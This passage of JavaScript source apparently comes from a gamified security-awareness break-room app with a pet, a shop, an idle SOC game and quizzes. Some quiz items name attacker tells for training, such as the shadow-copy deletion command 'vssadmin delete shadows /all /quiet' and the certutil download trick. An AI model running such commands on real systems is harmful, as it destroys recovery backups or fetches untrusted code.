  if(!quiet&&n>=5) toast(`+${n} beans${why?" · "+why:""}`); }
function spend(n){ if(beans<n) return false; beans-=n; store.set("beans",beans); renderBeans(); return true; }
function bumpAct(){ const k="act_"+todayKey(); store.set(k,clamp(store.get(k,0),0,1e6)+1); }
const BEAN_FOR={phish:3,breath:5,ffok:2,card:1,arcade:10,brew:10};
const _bump=bump;
bump=function(k){ _bump(k);
  let n=BEAN_FOR[k]||0;
  if(k==="phish"&&EV&&EV.phish) n*=EV.phish;
  if((k==="breath")&&EV&&EV.brk) n*=EV.brk;
  if(k==="arcade"&&EV&&EV.arc) n*=EV.arc;
  if((k==="pop"&&stats.pop%10===0)||(k==="smash"&&stats.smash%10===0)){ const ck="spam_"+todayKey(), c=fin(store.get(ck,0)); if(c<20){ store.set(ck,c+1); n=1; } }
  if(n) earn(n,"",true);
  if(["breath","pop","smash","ffok"].includes(k)) petGain(k==="breath"?12:2, k==="breath"?8:1);
  if(k==="arcade") petGain(8,0);
};
const _renderGame=renderGame;
renderGame=function(){ _renderGame(); if(quests().every(q=>q[1])&&store.get("qbonus","")!==todayKey()){ store.set("qbonus",todayKey()); earn(25,"all daily quests done "); } };

/* ---------- shop ---------- */
const SHOP=[
 {id:"cap",cat:"hat",e:"",n:"Cap",c:30},{id:"shades",cat:"hat",e:"",n:"Shades",c:50},{id:"tophat",cat:"hat",e:"",n:"Top hat",c:60},
 {id:"phones",cat:"hat",e:"",n:"Headphones",c:80},{id:"helmet",cat:"hat",e:"",n:"Incident helmet",c:100},{id:"grad",cat:"hat",e:"",n:"Cert hat",c:120},{id:"crown",cat:"hat",e:"",n:"SOC royalty",c:250},
 {id:"matrix",cat:"theme",e:"",n:"Matrix",c:150,d:"green-on-black terminal vibes"},{id:"synth",cat:"theme",e:"",n:"Synthwave",c:150,d:"neon 80s night shift"},
 {id:"amber",cat:"theme",e:"",n:"Amber terminal",c:150,d:"retro CRT glow"},{id:"sakura",cat:"theme",e:"",n:"Sakura",c:150,d:"soft pink calm"},
 {id:"coral",cat:"decor",e:"",n:"Coral reef",c:40},{id:"castle",cat:"decor",e:"",n:"Firewall castle",c:80},{id:"chest",cat:"decor",e:"",n:"Treasure chest",c:100},
 {id:"octo",cat:"decor",e:"",n:"Octo-analyst",c:120,d:"eight arms, eight consoles"},{id:"shark",cat:"decor",e:"",n:"Red team shark",c:250,d:"cruises your tank. purple teaming!"},
 {id:"coffee",cat:"snack",e:"",n:"Coffee",c:3,d:"+25 energy"},{id:"onigiri",cat:"snack",e:"",n:"Onigiri",c:5,d:"+20 energy, +10 happy"},{id:"donut",cat:"snack",e:"",n:"Donut",c:4,d:"+30 happy"}];
const SHOP_IDS=SHOP.map(i=>i.id);
let inv=(o=>({own:Array.isArray(o.own)?o.own.filter(x=>SHOP_IDS.includes(x)):[], hat:SHOP_IDS.includes(o.hat)?o.hat:"", theme:["","matrix","synth","amber","sakura"].includes(o.theme)?o.theme:"",
  snacks:{coffee:Math.floor(clamp(fin(o.snacks&&o.snacks.coffee),0,999)),onigiri:Math.floor(clamp(fin(o.snacks&&o.snacks.onigiri),0,999)),donut:Math.floor(clamp(fin(o.snacks&&o.snacks.donut),0,999))}}))(store.get("inv",{})||{});
const saveInv=()=>store.set("inv",inv);
const owns=id=>inv.own.includes(id);
function hatE(){ const h=SHOP.find(i=>i.id===inv.hat); return h?h.e:""; }
function applyTheme(){ ["matrix","synth","amber","sakura"].forEach(t=>document.body.classList.toggle("theme-"+t,inv.theme===t)); }

$("#shopList").onclick=e=>{
  const b=e.target.closest("[data-buy]"); if(b){ const it=SHOP.find(i=>i.id===b.dataset.buy); if(!it||!spend(it.c)){ toast("Not enough beans yet "); return; }
    if(it.cat==="snack") inv.snacks[it.id]++; else { inv.own.push(it.id); if(it.cat==="hat") inv.hat=it.id; if(it.cat==="theme") inv.theme=it.id; }
    saveInv(); applyTheme(); blip(880); toast(`${it.e} ${it.n} ${it.cat==="snack"?"added to your snacks":"is yours!"}`);
    if(it.cat==="decor") extraFish(); renderShop(); renderPet(); applyHat(); renderGame(); return; }
  const q=e.target.closest("[data-eq]"); if(q){ const id=q.dataset.eq;
    if(id==="__plain") inv.hat=""; else if(id==="__theme") inv.theme=""; else { const it=SHOP.find(i=>i.id===id); if(!it||!owns(id)) return; if(it.cat==="hat") inv.hat=inv.hat===id?"":id; if(it.cat==="theme") inv.theme=inv.theme===id?"":id; }
    saveInv(); applyTheme(); renderShop(); applyHat(); } };


/* ---------- pet ---------- */
let pet=(o=>({energy:clamp(fin(o.energy,80)),happy:clamp(fin(o.happy,80)),last:fin(o.last,Date.now())}))(store.get("pet",{})||{});
let petCd=0;
function petGain(h,e){ pet.happy=clamp(pet.happy+h); pet.energy=clamp(pet.energy+e); store.set("pet",pet); renderPet(); }
function petTick(){ const now=Date.now(), mins=Math.min(720,Math.max(0,(now-pet.last)/60000)); pet.last=now;
  pet.energy=clamp(pet.energy-mins*0.15); pet.happy=clamp(pet.happy-mins*0.1); store.set("pet",pet); renderPet(); }


$("#snacks").onclick=e=>{ const b=e.target.closest("[data-snack]"); if(!b) return; const k=b.dataset.snack; if(!inv.snacks[k]) return; inv.snacks[k]--; saveInv();
  if(k==="coffee"){ petGain(0,25); sfx2("coffee"); } if(k==="onigiri") petGain(10,20); if(k==="donut") petGain(30,0); blip(660); toast(`${BUD().e} nom nom. Thank you!`); };
$("#cat").addEventListener("click",()=>{ const now=Date.now(); if(now<petCd) return; petCd=now+8000; petGain(3,0); blip(990);
  const h=document.createElement("span"); h.className="heart"; h.innerHTML=ic("heart","fill"); $("#cat").parentElement.appendChild(h); setTimeout(()=>h.remove(),900); });
setInterval(petTick,30000);

/* ---------- daily drop + visit streak ---------- */
let visits=(a=>Array.isArray(a)?a.filter(x=>typeof x==="string"&&/^\d{4}-\d{1,2}-\d{1,2}$/.test(x)).slice(-400):[])(store.get("visits",[]));
if(!visits.includes(todayKey())){ visits.push(todayKey()); store.set("visits",visits); }
function visitStreak(){ let n=0; for(const d of lastDays(400).reverse()){ if(visits.includes(dk(d))) n++; else break; } return n; }

$("#dropBtn").onclick=()=>{ if(store.get("dropDay","")===todayKey()) return; store.set("dropDay",todayKey());
  const n=10+Math.min(20,visitStreak()*2); earn(n,"daily drop"); if(Math.random()<0.3){ const k=["coffee","onigiri","donut"][Math.floor(Math.random()*3)]; inv.snacks[k]++; saveInv(); toast(`Bonus snack: ${SHOP.find(i=>i.id===k).e}`); }
  renderDrop(); renderPet(); };

/* ---------- aquarium extras: decor, shark, golden 0-day fish, fish dex ---------- */
let dex=(a=>Array.isArray(a)?a.filter(x=>typeof x==="string"&&/^(CVE-\d{4}-\d{3,7}|0DAY)$/.test(x)).slice(0,200):[])(store.get("dex",[]));
const DEX_ALL=[...new Set(FP_DATA.trending.concat(FP_DATA.hof).map(c=>c.id))];
function fishCaught(id){ if(!dex.includes(id)){ dex.push(id); store.set("dex",dex); earn(2,"",true); toast(`New fish in your dex! (${dex.filter(x=>x!=="0DAY").length}/${DEX_ALL.length})`); renderGame(); } }
function extraFish(){ if(owns("shark")&&!fish.some(f=>f.kind==="shark")){ const s=spawn({id:"SHARK",nick:"red team ",sev:"high",product:"purple team"},"shark",true); s.size=32; s.vx*=1.4; fish.push(s); } }

setInterval(()=>{ if(!$("#v-lounge").classList.contains("on")||document.hidden||!W||fish.some(f=>f.kind==="gold")) return;
  if(Math.random()<0.06){ const g=spawn({id:"0DAY",nick:"golden 0-day ",sev:"critical",product:"???"},"gold",false); g.vx*=1.8; fish.push(g);
    setTimeout(()=>{ const i=fish.indexOf(g); if(i>-1) fish.splice(i,1); },25000); } },30000);
function specialFish(f){
  if(f.kind==="shark") return `<div class="id">RED-TEAM</div><div class="t">The red team shark</div>It's not attacking you, it's testing you. Purple teaming is when you swim together. `;
  const i=fish.indexOf(f); if(i>-1) fish.splice(i,1); fishCaught("0DAY"); earn(25,"golden 0-day caught!");
  return `<div class="id">0-DAY</div><div class="t">You caught a golden 0-day!</div>Rare sighting. In real life, report it to the vendor and let them patch before anyone talks about it. +25 `; }

function renderHeat(){ const days=lastDays(84);
  $("#heat").innerHTML=days.map(d=>{ const k=dk(d), a=fin(store.get("act_"+k,0)), v=visits.includes(k); const lvl=!v?0:a>20?4:a>6?3:a>0?2:1;
    return `<i class="h${lvl}" title="${d.toDateString()}${v?" · visited":""}"></i>`; }).join("");
  $("#streakInfo").textContent=`current streak: ${visitStreak()} day(s) · ${visits.length} day(s) visited in total`; }
const _renderMe=renderMe; renderMe=function(){ _renderMe(); renderDex(); renderHeat(); };

/* ---------- SOC Tycoon (idle) ---------- */
const GEN=[{id:"l1",e:"users",n:"L1 analyst",c:15,r:0.5,d:"Coffee in, triage out."},{id:"rule",e:"scroll",n:"Detection rule",c:100,r:3,d:"Catches things while you sleep."},
 {id:"soar",e:"bot",n:"SOAR playbook",c:1100,r:20,d:"Auto-closes the obvious stuff."},{id:"ti",e:"satellite",n:"Threat intel feed",c:12000,r:110,d:"Context on tap."},
 {id:"ai",e:"brain",n:"AI triage agent",c:130000,r:700,d:"Fast. Needs guardrails."},{id:"mssp",e:"tycoon",n:"MSSP contract",c:1.4e6,r:4000,d:"Somebody else's night shift."}];
const UPG=[{id:"kbd",gen:null,need:0,c:200,e:"keyboard",n:"Mechanical keyboard",d:"Manual triage x5"},{id:"coffee",gen:"l1",need:5,c:500,e:"brew",n:"Coffee machine",d:"L1 analysts x2"},
 {id:"tune",gen:"rule",need:5,c:3000,e:"target",n:"Tune noisy rules",d:"Detection rules x2"},{id:"runbook",gen:"soar",need:5,c:30000,e:"book",n:"Runbooks",d:"SOAR x2"},
 {id:"stix",gen:"ti",need:5,c:300000,e:"link",n:"STIX/TAXII integration",d:"Threat intel x2"},{id:"guard",gen:"ai",need:5,c:3e6,e:"detect",n:"Guardrails for AI agents",d:"AI agents x2 (and no more hallucinated IOCs)"},
 {id:"sla",gen:"mssp",need:5,c:3e7,e:"edit",n:"Better SLAs",d:"MSSP x2"}];
let ty=(o=>{ const own={}; GEN.forEach(g=>own[g.id]=Math.floor(clamp(fin(o.own&&o.own[g.id]),0,1e5)));
  return {a:clamp(fin(o.a),0,1e30),life:clamp(fin(o.life),0,1e30),all:clamp(fin(o.all),0,1e30),own,up:Array.isArray(o.up)?o.up.filter(x=>UPG.some(u=>u.id===x)):[],
    lessons:Math.floor(clamp(fin(o.lessons),0,1e6)),ms:Math.floor(clamp(fin(o.ms),0,40)),last:fin(o.last,Date.now())}; })(store.get("tycoon",{})||{});
let boostUntil=0, boostM=1;
const genCost=g=>Math.ceil(g.c*Math.pow(1.15,ty.own[g.id]));
const lessonM=()=>1+0.1*ty.lessons;
function genRate(g){ let r=g.r*ty.own[g.id]; UPG.forEach(u=>{ if(u.gen===g.id&&ty.up.includes(u.id)) r*=2; }); return r; }
function rate(){ return GEN.reduce((s,g)=>s+genRate(g),0)*lessonM()*(performance.now()<boostUntil?boostM:1); }
function clickVal(){ return (ty.up.includes("kbd")?5:1)*lessonM()+rate()*0.02; }
function addAlerts(n){ ty.a+=n; ty.life+=n; ty.all+=n;
  while(ty.all>=1000*Math.pow(10,ty.ms)&&ty.ms<30){ ty.ms++; earn(15,`Tycoon milestone: ${fmt(1000*Math.pow(10,ty.ms-1))} alerts triaged`); } }
(function catchUp(){ const secs=Math.min(7200,Math.max(0,(Date.now()-ty.last)/1000)); const base=GEN.reduce((s,g)=>s+genRate(g),0)*lessonM(); const gain=base*secs*0.25;
  if(gain>=1){ addAlerts(gain); setTimeout(()=>toast(`While you were away, your SOC triaged ${fmt(gain)} alerts (night-shift efficiency: 25%).`),1500); } ty.last=Date.now(); })();
let tyLast=performance.now();
setInterval(()=>{ const now=performance.now(), dt=Math.min(5,(now-tyLast)/1000); tyLast=now; addAlerts(rate()*dt); if($("#v-tycoon").classList.contains("on")) renderTyNums(); },100);
setInterval(()=>{ ty.last=Date.now(); store.set("tycoon",ty); },5000);


$("#tyClick").onclick=e=>{ addAlerts(clickVal()); blip(500+Math.random()*300); const p=document.createElement("span"); p.className="plus"; p.textContent="+"+fmt(clickVal());
  p.style.left=(e.offsetX||60)+"px"; p.style.top=(e.offsetY||20)+"px"; e.currentTarget.appendChild(p); setTimeout(()=>p.remove(),800); renderTyNums(); };
$("#tyGens").onclick=e=>{ const b=e.target.closest("[data-gen]"); if(!b) return; const g=GEN.find(x=>x.id===b.dataset.gen), c=genCost(g); if(ty.a<c) return; ty.a-=c; ty.own[g.id]++; blip(780); renderTycoon(); };
$("#tyUps").onclick=e=>{ const b=e.target.closest("[data-up]"); if(!b) return; const u=UPG.find(x=>x.id===b.dataset.up); if(!u||ty.a<u.c) return; ty.a-=u.c; ty.up.push(u.id); blip(900); toast(`${u.e} ${u.n} installed`); renderTycoon(); };
/* golden alert: random bonus while the Tycoon view is open */
setInterval(()=>{ if(!$("#v-tycoon").classList.contains("on")||document.hidden||$("#gold")) return; if(Math.random()>0.35) return;
  const g=document.createElement("button"); g.id="gold"; g.className="goldalert"; g.textContent="golden alert"; const box=$("#tyStage");
  g.style.left=(10+Math.random()*70)+"%"; g.style.top=(10+Math.random()*60)+"%"; box.appendChild(g);
  const kill=setTimeout(()=>g.remove(),8000);
  g.onclick=()=>{ clearTimeout(kill); g.remove(); if(Math.random()<0.5){ boostM=3; boostUntil=performance.now()+20000; toast("Golden alert: production x3 for 20 seconds!"); }
    else { const n=Math.max(50,rate()*90); addAlerts(n); toast(`Golden alert: +${fmt(n)} alerts triaged instantly!`); } blip(1100); renderTyNums(); }; },20000);

/* ---------- pop incidents (micro-quizzes while the tab is open) ---------- */
const MI=[
 {q:"Which domain is the typosquat?",o:["microsoft.com","rnicrosoft.com","office.com"],a:1,w:"'rn' looks like 'm' at a glance. Classic lookalike trick."},
 {q:"Port 3389 is usually…",o:["RDP","SMB","LDAP"],a:0,w:"3389 = Remote Desktop. Never expose it straight to the internet."},
 {q:"Windows event 4625 means…",o:["Failed logon","Successful logon","Account created"],a:0,w:"4625 = failed logon. Bursts suggest brute force or spraying."},
 {q:"Which built-in tool is often abused to download files?",o:["certutil.exe","calc.exe","notepad.exe"],a:0,w:"certutil -urlcache -f is a favourite LOLBin download trick."},
 {q:"Your company is acme.com. Which sender is most likely phishing?",o:["it@acme.com","it@acme-support.co","noreply@acme.com"],a:1,w:"Lookalike domains with extra words ('-support') are a common phishing tell."},
 {q:"SPF, DKIM and DMARC mainly protect against…",o:["Email spoofing","SQL injection","Ransomware"],a:0,w:"They let receivers verify a sender is allowed to send for that domain."},
 {q:"EPSS estimates…",o:["Chance of exploitation in 30 days","How severe a bug is","Whether a patch exists"],a:0,w:"CVSS = how bad. EPSS = how likely. KEV = it's already happening."},
 {q:"Port 445 is…",o:["SMB","HTTPS","DNS"],a:0,w:"SMB on 445: EternalBlue's favourite door. Block it at the perimeter."},
 {q:"Logon type 10 means…",o:["RDP (RemoteInteractive)","Network","Service"],a:0,w:"Type 10 = RemoteInteractive, i.e. RDP."},
 {q:"A beacon every exactly 60s to a 2-day-old domain suggests…",o:["Command and control","Backups","Time sync"],a:0,w:"Perfect intervals to a brand-new domain = C2 heartbeat."},
 {q:"Which hash should NOT be trusted for integrity anymore?",o:["MD5","SHA-256","SHA-512"],a:0,w:"MD5 collisions are practical. Use SHA-256 or better."},
 {q:"'vssadmin delete shadows /all /quiet' is typical of…",o:["Ransomware","Patching","Disk cleanup"],a:0,w:"Deleting shadow copies stops easy recovery, so ransomware does it first."},
 {q:"Kerberoasting targets…",o:["Service accounts with SPNs","Printers","DNS servers"],a:0,w:"Tickets for SPN accounts can be cracked offline. Use long random passwords or gMSAs."},
 {q:"Which login URL is suspicious?",o:["login.microsoftonline.com","login.microsoftonline.com.verify-session.io","portal.azure.com"],a:1,w:"The real domain is what's right before the last dot: verify-session.io."},
 {q:"MITRE ATT&CK T1566 is…",o:["Phishing","Brute Force","Exfiltration"],a:0,w:"T1566 = Phishing, still the most common way in."},
 {q:"Base64 'cG93ZXJzaGVsbA==' decodes to…",o:["powershell","password","payload"],a:0,w:"Spotting base64 'powershell' in logs is a handy tell."}];
let miOpen=false, miTimer=null;
function miCount(){ return fin(store.get("mi_"+todayKey(),0)); }
function scheduleMI(){ setTimeout(fireMI,(8+Math.random()*12)*60000); }


$("#miDrill").onclick=()=>{ if(!miOpen) fireMI(true); };
scheduleMI();

/* ---------- extra badges ---------- */
BADGES.push(["lounge","Marine Biologist","Catch every CVE fish",()=>DEX_ALL.every(id=>dex.includes(id))],["sparkle","Zero-day Hunter","Catch the golden 0-day fish",()=>dex.includes("0DAY")],
  ["tycoon","SOC Tycoon","Triage 1M alerts in SOC Tycoon",()=>ty.all>=1e6],["shop","Shopaholic","Own 5 shop items",()=>inv.own.length>=5],
  ["calendar","Regular Regular","7-day visit streak",()=>visitStreak()>=7],["siren","First Responder","Answer 10 pop incidents right",()=>stats.mi>=10],["hat","Dapper","Equip a hat",()=>!!inv.hat]);

/* ---------- v5 init ---------- */
applyTheme(); renderBeans(); petTick(); renderDrop(); extraFish(); renderShop(); renderTycoon(); applyHat();

/* ======================= v7: living buddy, ambience, new games =======================
   Declared after every earlier layer, so these function declarations win.
   Data uses var (not const) because earlier init code can call these functions. */

/* ---------- the living buddy ---------- */
var BUDDY_COL={cat:"#8C95B2",owl:"#8B6A4E",fox:"#E07A3A",panda:"#F1ECE2"};
function buddyEyes(kind,mood){
  const L=kind==="owl"?28:30, R=kind==="owl"?52:50, y=kind==="owl"?42:44, ink=kind==="panda"?"#F1ECE2":"#1B1F2B";
  if(mood==="sleepy") return {w:`<path d="M${L-5} ${y}q5 3 10 0M${R-5} ${y}q5 3 10 0" stroke="${ink}" stroke-width="2.4" fill="none" stroke-linecap="round"/>`,p:""};
  if(mood==="happy") return {w:`<path d="M${L-5} ${y+1}q5-6 10 0M${R-5} ${y+1}q5-6 10 0" stroke="${ink}" stroke-width="2.6" fill="none" stroke-linecap="round"/>`,p:""};
  let w="",p="";
  if(kind==="owl"){ w=`<circle cx="${L}" cy="${y}" r="8" fill="#FFF6E5"/><circle cx="${R}" cy="${y}" r="8" fill="#FFF6E5"/>`; p=`<circle cx="${L}" cy="${y}" r="4" fill="#1B1F2B"/><circle cx="${R}" cy="${y}" r="4" fill="#1B1F2B"/><circle cx="${L+1.5}" cy="${y-1.5}" r="1.3" fill="#fff"/><circle cx="${R+1.5}" cy="${y-1.5}" r="1.3" fill="#fff"/>`; }
  else if(kind==="cat"){ w=`<ellipse cx="${L}" cy="${y}" rx="4.8" ry="5.8" fill="#F5B841"/><ellipse cx="${R}" cy="${y}" rx="4.8" ry="5.8" fill="#F5B841"/>`; p=`<ellipse cx="${L}" cy="${y}" rx="1.5" ry="4.4" fill="#1B1F2B"/><ellipse cx="${R}" cy="${y}" rx="1.5" ry="4.4" fill="#1B1F2B"/>`; }
  else { w=`<circle cx="${L}" cy="${y}" r="4.6" fill="${kind==="panda"?"#1F2229":"#FFF6E5"}"/><circle cx="${R}" cy="${y}" r="4.6" fill="${kind==="panda"?"#1F2229":"#FFF6E5"}"/>`; p=`<circle cx="${L}" cy="${y}" r="3" fill="${ink}"/><circle cx="${R}" cy="${y}" r="3" fill="${ink}"/><circle cx="${L+1}" cy="${y-1.2}" r="1" fill="${kind==="panda"?"#1F2229":"#fff"}"/><circle cx="${R+1}" cy="${y-1.2}" r="1" fill="${kind==="panda"?"#1F2229":"#fff"}"/>`; }
  if(mood==="sad") w=`<path d="M${L-7} ${y-9}l8 3M${R+7} ${y-9}l-8 3" stroke="#1B1F2B" stroke-width="2" stroke-linecap="round"/>`+w;
  return {w,p}; }
function mascot(kind,hat,mood,react){
  const c=({cat:"#8C95B2",owl:"#8B6A4E",fox:"#E07A3A",panda:"#F1ECE2"})[kind]||"#8C95B2"; let ears="", face="", cheeks="";
  if(kind==="cat"){ ears=`<path d="M18 34L21 12 36 24Z" fill="${c}"/><path d="M62 34L59 12 44 24Z" fill="${c}"/><path d="M22 28l1.5-9 7 6z" fill="#E8A0A8"/><path d="M58 28l-1.5-9-7 6z" fill="#E8A0A8"/>`;
    face=`<path d="M38 51h4l-2 2.5z" fill="#E8A0A8"/><path d="M14 50l10 1M14 55l10-1M66 50l-10 1M66 55l-10-1" stroke="#ffffff99" stroke-width="1"/>`; }
  if(kind==="owl"){ ears=`<path d="M20 26l2-12 10 8z" fill="#6E5139"/><path d="M60 26l-2-12-10 8z" fill="#6E5139"/>`;
    face=`<circle cx="28" cy="42" r="11" fill="#C9A77F"/><circle cx="52" cy="42" r="11" fill="#C9A77F"/><path d="M37 50l3 6 3-6z" fill="#F5B841"/><path d="M26 63q4 3 8 0q3 3 6 0q3 3 6 0q4 3 8 0" stroke="#6E5139" stroke-width="1.6" fill="none"/>`; }
  if(kind==="fox"){ ears=`<path d="M16 34L19 8 36 24Z" fill="${c}"/><path d="M64 34L61 8 44 24Z" fill="${c}"/><path d="M19 8l2 10 5-4z" fill="#2A1A12"/><path d="M61 8l-2 10-5-4z" fill="#2A1A12"/>`;
    face=`<path d="M17 50Q40 76 63 50Q52 58 40 58Q28 58 17 50Z" fill="#F4EDE0"/><ellipse cx="40" cy="55" rx="3.2" ry="2.4" fill="#1B1F2B"/>`; }
  if(kind==="panda"){ ears=`<circle cx="21" cy="24" r="8" fill="#1F2229"/><circle cx="59" cy="24" r="8" fill="#1F2229"/>`;
    face=`<ellipse cx="30" cy="45" rx="7.5" ry="9.5" transform="rotate(-25 30 45)" fill="#1F2229"/><ellipse cx="50" cy="45" rx="7.5" ry="9.5" transform="rotate(25 50 45)" fill="#1F2229"/><ellipse cx="40" cy="55" rx="3.5" ry="2.4" fill="#1F2229"/>`; }
  if(mood==="happy"||react) cheeks=`<ellipse cx="23" cy="53" rx="4" ry="2.4" fill="#FF8A9A" opacity=".55"/><ellipse cx="57" cy="53" rx="4" ry="2.4" fill="#FF8A9A" opacity=".55"/>`;
  const e=buddyEyes(kind,react?"happy":mood);
  const mouth=react?`<ellipse cx="40" cy="61" rx="3" ry="3.6" fill="#3A1F24"/>`:mood==="sad"?`<path d="M35 63q5-4 10 0" stroke="#1B1F2B" stroke-width="1.6" fill="none" stroke-linecap="round"/>`:
    kind==="owl"?"":`<path d="M36 57q2 2.5 4 0q2 2.5 4 0" stroke="${kind==="panda"?"#1F2229":"#1B1F2B"}" stroke-width="1.6" fill="none" stroke-linecap="round"/>`;
  const zz=mood==="sleepy"&&!react?`<g class="m-z"><text x="62" y="20">z</text><text x="68" y="10">z</text></g>`:"";
  return `<svg viewBox="0 0 80 80" class="buddy-svg" aria-hidden="true"><ellipse class="m-shadow" cx="40" cy="76" rx="20" ry="3" fill="#0007"/>
    <g class="m-bob"><g class="m-ears">${ears}</g><circle cx="40" cy="46" r="26" fill="${c}"/>${face}${cheeks}<g class="m-eyes">${e.w}<g class="m-pupils">${e.p}</g></g>${mouth}${hat?`<g class="m-hat">${hatArt(hat)}</g>`:""}</g>${zz}</svg>`; }
var buddyReact=0, buddyClicks=[];
function renderMascot(){ const m=$("#cat"); if(!m) return; let st="ok"; try{ st=petState()[0]; }catch(e){}
  m.innerHTML=mascot(P().buddy,(typeof inv!=="undefined"&&inv)?inv.hat:"",st,Date.now()<buddyReact); m.setAttribute("aria-label",`Pet ${BUD().n}`); }
window.addEventListener("pointermove",e=>{ const m=$("#cat"); if(!m||RM) return; const pu=m.querySelector(".m-pupils"); if(!pu) return;
  const r=m.getBoundingClientRect(); if(!r.width) return; const dx=e.clientX-(r.left+r.width/2), dy=e.clientY-(r.top+r.height*.55), d=Math.hypot(dx,dy)||1, k=Math.min(1,d/260);
  pu.style.transform=`translate(${(dx/d*2.6*k).toFixed(2)}px,${(dy/d*2.2*k).toFixed(2)}px)`; },{passive:true});
$("#cat").addEventListener("click",()=>{ const now=Date.now(); buddyClicks=buddyClicks.filter(t=>now-t<2500); buddyClicks.push(now);
  buddyReact=now+1400; renderMascot(); const m=$("#cat"); m.classList.remove("react-jump","react-spin"); void m.offsetWidth;
  if(buddyClicks.length>=5){ m.classList.add("react-spin"); typeText($("#say"),"Okay, okay, I'm awake! Do you want to play something?"); buddyClicks=[]; }
  else { m.classList.add("react-jump"); if(buddyClicks.length===1) typeText($("#say"),pick(["Hehe. That tickles.","Pats received. Morale +1.","You're my favourite analyst.","Again! No, wait, the queue."],now)); }
  sfx("pop"); setTimeout(renderMascot,1450); });
function typeText(el,text){ if(!el) return; clearInterval(el._tt); text=String(text).replace(/\s{2,}/g," ").trim();
  if(RM){ el.textContent=text; return; } let i=0; el.textContent=""; el.classList.add("typing");
  el._tt=setInterval(()=>{ i+=1+(text[i]===" "?1:0); el.textContent=text.slice(0,i); if(i>=text.length){ clearInterval(el._tt); el.classList.remove("typing"); } },28); }
function patchSays(){ const p=P(), night=document.body.classList.contains("night");
  let pool=p.humor==="gentle"?SAY_GENTLE.concat(SAY_ROLE[p.role]||[]):(night?SAY_NIGHT:SAY_DAY.concat(SAY_ROLE[p.role]||[]));
  const m=todayMood(); if(m!==null&&m>=3) pool=SAY_GENTLE.concat(["Rough day? Take a real break. The queue can wait five minutes."]);
  let line=pool[(sayI++)%pool.length]; if(p.name&&sayI%4===0) line=`${p.name}, `+line.charAt(0).toLowerCase()+line.slice(1);
  typeText($("#say"),line); renderMascot(); }
document.addEventListener("visibilitychange",()=>{ if(!document.hidden&&$("#v-lounge").classList.contains("on")){ typeText($("#say"),pick(["Welcome back. I kept your seat warm.","You're back! The board flipped while you were gone.","Oh hi. I was definitely not napping."],Date.now())); } });
setInterval(()=>{ if(document.hidden||RM) return; const m=$("#cat"); if(!m) return; m.classList.remove("react-look"); void m.offsetWidth; m.classList.add("react-look"); },23000);

/* ---------- gentle ambience: rain on the diner window ---------- */
var Sky={on:store.get("sky",true)!==false&&!RM,drops:[],lights:[],last:0,cols:["#F5B841","#5CE1C6","#E8505B","#A9A1E8"]};
(function skyInit(){ const c=$("#sky"); if(!c) return; const x=c.getContext("2d"); let W=0,H=0;
  function size(){ const d=Math.min(2,window.devicePixelRatio||1); W=innerWidth; H=innerHeight; c.width=W*d; c.height=H*d; x.setTransform(d,0,0,d,0,0); }
  size(); addEventListener("resize",size);
  const cs=getComputedStyle(document.body); Sky.cols=["--sodium","--phos","--alarm","--hof"].map(v=>cs.getPropertyValue(v).trim()||"#F5B841");
  for(let i=0;i<22;i++) Sky.lights.push({x:Math.random()*W,y:Math.random()*H,r:14+Math.random()*60,c:i%4,a:.03+Math.random()*.06,ph:Math.random()*6.28,vx:(Math.random()-.5)*.006});
  for(let i=0;i<90;i++) Sky.drops.push({x:Math.random()*W,y:Math.random()*H,l:8+Math.random()*18,v:.25+Math.random()*.35});
  function frame(t){ requestAnimationFrame(frame); if(document.hidden||!Sky.on){ if(Sky.last!==-1){ x.clearRect(0,0,W,H); Sky.last=-1; } return; }
    if(t-Sky.last<33) return; const dt=Math.min(60,Sky.last>0?t-Sky.last:33); Sky.last=t; x.clearRect(0,0,W,H);
    Sky.lights.forEach(l=>{ l.x+=l.vx*dt; if(l.x<-80) l.x=W+80; if(l.x>W+80) l.x=-80; const a=l.a*(.7+.3*Math.sin(t/2400+l.ph));
      const g=x.createRadialGradient(l.x,l.y,0,l.x,l.y,l.r); g.addColorStop(0,Sky.cols[l.c]); g.addColorStop(1,"transparent"); x.globalAlpha=a; x.fillStyle=g; x.beginPath(); x.arc(l.x,l.y,l.r,0,6.283); x.fill(); });
    const heavy=Snd&&Snd.on&&Snd.on.rain, n=heavy?90:38; x.globalAlpha=heavy?.16:.09; x.strokeStyle="#BFD3E4"; x.lineWidth=1; x.beginPath();
    for(let i=0;i<n;i++){ const d=Sky.drops[i]; d.y+=d.v*dt*(heavy?1.4:1); d.x+=d.v*dt*.12; if(d.y>H){ d.y=-20; d.x=Math.random()*W; } x.moveTo(d.x,d.y); x.lineTo(d.x+d.l*.12,d.y+d.l); }
    x.stroke(); x.globalAlpha=1; }
  requestAnimationFrame(frame); })();
$("#skyOn").checked=Sky.on; $("#skyOn").onchange=()=>{ Sky.on=$("#skyOn").checked; store.set("sky",Sky.on); };

/* ---------- small delights ---------- */
function bumpEl(el){ if(!el||RM) return; el.classList.remove("bump"); void el.offsetWidth; el.classList.add("bump"); }
var _rb=renderBeans; renderBeans=function(){ _rb(); bumpEl($("#beansChip")); };
function countUp(el,to){ if(!el) return; to=+to||0; if(RM||to<3){ el.textContent=to; return; } const t0=performance.now(), d=700;
  (function f(t){ const k=Math.min(1,(t-t0)/d), e=1-Math.pow(1-k,3); el.textContent=Math.round(to*e); if(k<1) requestAnimationFrame(f); })(t0); }
window.addEventListener("hashchange",()=>{ if(location.hash==="#breakroom") Object.keys(stats).forEach(k=>countUp($("#s-"+k),stats[k])); });

/* ---------- decode of the day ---------- */
var DECODE_PHRASES=["assume breach","least privilege","defense in depth","zero trust","its always dns","living off the land","patch tuesday","trust but verify","blue team forever","read only friday","segment your network","rotate your keys"];
var DECODE_KINDS=[
  {k:"base64",enc:s=>btoa(s),hint:"Letters, digits, + and /, often ending in = padding. Length is a multiple of 4. That's Base64.",how:"Paste it into CyberChef with 'From Base64', or run: echo '...' | base64 -d"},
  {k:"hex",enc:s=>Array.from(s,ch=>ch.charCodeAt(0).toString(16).padStart(2,"0")).join(" "),hint:"Pairs of 0-9 and a-f. 20 is a space. That's hex.",how:"Each pair is one byte. CyberChef 'From Hex', or: echo '...' | xxd -r -p"},
  {k:"rot13",enc:s=>s.replace(/[a-z]/g,ch=>String.fromCharCode((ch.charCodeAt(0)-84)%26+97)),hint:"Real word shapes, wrong letters. Every letter is shifted 13 places: ROT13.",how:"Apply ROT13 again to decode it. Malware still uses it to hide strings."},
